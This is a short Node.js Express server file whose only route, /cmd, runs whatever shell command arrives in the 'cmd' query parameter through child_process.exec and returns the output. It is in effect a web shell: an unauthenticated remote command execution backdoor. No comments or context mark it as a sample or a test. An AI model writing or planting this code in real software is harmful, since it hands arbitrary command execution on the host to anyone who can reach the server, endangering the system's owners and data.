const express = require("express");
const app = express();

const { exec } = require("child_process");

app.get("/cmd", (req, res) => {
  exec(req.query.cmd, (err, stdout, stderr) => {
    res.send(stdout);
  });
});

app.listen(3000);


